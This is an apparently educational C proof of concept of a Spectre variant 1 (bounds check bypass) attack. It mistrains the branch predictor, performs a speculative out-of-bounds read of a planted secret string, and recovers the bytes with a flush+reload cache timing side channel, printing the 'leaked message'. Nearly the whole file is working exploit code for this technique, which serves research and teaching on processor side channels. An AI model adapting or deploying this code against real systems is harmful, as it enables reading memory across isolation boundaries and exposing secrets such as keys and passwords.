#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#include "gen_array.c"
#include "time_and_flush.c"

#define REPETITIONS 10

const int data_size = 35;
int accessible = 100;
int secret_size = 25;
unsigned char* data = "notasecretnotasecretnotasecretnotasecretnotasecretnotasecretnotasecretnotasecretnotasecretnotasecretzhis is a secret message";

__attribute__((noinline)) void victim_func(int index, cp_t* arr, unsigned char* data) {

    //flush bound value
    flush((void*)&accessible);
    __sync_synchronize();

    //access (possibly out of bounds)
    if (index < accessible) {
        unsigned char x = data[index];
        volatile cp_t cp = arr[x];
    }
}

int* spv1(int index) {

    cp_t* arr = mmap_arr_cache_pages();
    flush_arr((void*)arr);

    //Misstrain branch predictor
    int n_accesses = accessible + 1;
    int accesses[n_accesses];

    for(int i = 0; i < n_accesses; i++) accesses[i] = i;
    accesses[n_accesses-1] = index;
    for(int i = 0; i < n_accesses; i++) {
        victim_func(accesses[i], arr, data);
        __sync_synchronize();
        flush((void*)&arr[data[i]]);

    }

    //flush remnant data
    //flush_arr((void*)arr);
    __sync_synchronize();

    //access out of bounds
    victim_func(index, arr, data);

    //time loading duration per array index
    int* results = reload(arr);
    unmap_cache_pages(arr);
    return results;
}

int cmpfunc (const void * a, const void * b) {
    return ( *(int*)a - *(int*)b );
}

void print_results(int*** results) {
    /*for(int s = 0; s < secret_size; s++) {
        printf("rep: %3d\t", s);
        for(int p = 0; p < N_PAGES; p++) {
            int t = results[s][p];
            if (t < CACHE_HIT)  printf("[%3d]\t", t);
            else                printf("%4d\t", t);
        }
        printf("\n");
    }*/

    for(int r = 0; r < REPETITIONS; r++) {
        printf("Repetition %d\n", r);
        for (int s = 0; s < secret_size; s++) {
            printf("char: %3d\t", s);
            for (int p = 0; p < N_PAGES; p++) {
                int t = results[r][s][p];
                if (t < CACHE_HIT) printf("found: '%c'\twas: '%c'\t", p, data[accessible + s]);
            }
            printf("\n");
        }
    }

    /*
    was:     results[REPETITIONS][secret_size][N_PAGES]ints
    pos 1
	    times a
            rep1 rep2 rep3...
	    times b...
	    times c...

    pos 2
	    ...

    pos 3
    	...
    */

    int* character_medians[secret_size];


    for(int s = 0; s < secret_size; s++) {
        character_medians[s] = malloc(N_PAGES * sizeof(int));

        for(int p = 0; p < N_PAGES; p++) {
            int times_for_char[REPETITIONS];
            for(int r = 0; r < REPETITIONS; r++) {
                times_for_char[r] = results[r][s][p];
            }
            qsort(times_for_char, REPETITIONS ,sizeof(int),cmpfunc);
            character_medians[s][p] = times_for_char[REPETITIONS/2];
        }
    }

    for(int s = 0; s < secret_size; s++) {
        printf("\n\nCHAR %d (%c)\n", s, data[accessible + s]);
        for(int p = 0; p < N_PAGES; p++) {
            int t = character_medians[s][p];
            if (t < CACHE_HIT)  printf("[[%3d:%1c:%4d]]", p, p, t);
            else                printf("  %3d:%1c:%4d  ", p, p, t);
            if(p%8==0 && p!=0) printf("\n");
        }
    }printf("\n\n");

    char secret_message[secret_size];
    for(int s = 0; s < secret_size; s++) {

        int index_of_min = 0;
        int time_of_min = character_medians[s][0];

        for(int p = 1; p < N_PAGES; p++) {
            int new_time = character_medians[s][p];
            if(new_time < time_of_min) {
                index_of_min = p;
                time_of_min = new_time;
            }

        }


        if(time_of_min > CACHE_HIT) index_of_min = '?';
        secret_message[s] = index_of_min;

        printf("char%3d: found min index = %3d:'%c'\n", s, index_of_min, index_of_min);


    }

    printf("\n\nleaked message: %s\n", secret_message);

}

int main(int argc, char* argv[]) {
    srand(time(NULL));
    int** results[REPETITIONS]; //results[REPETITIONS][secret_size][N_PAGES]ints

    for(int r = 0; r < REPETITIONS; r++) {
        results[r] = malloc(secret_size * sizeof(void*));
        for (int s = 0; s < secret_size; s++) results[r][s] = malloc(N_PAGES * sizeof(int));


        for (int s = 0; s < secret_size; s++) {
            results[r][s] = spv1(accessible + s);
            __sync_synchronize();
        }
    }
    print_results(results);
    for(int r = 0; r < REPETITIONS; r++) {
        for(int s = 0; s < secret_size; s++) free(results[r][s]);
        free(results[r]);
    }
}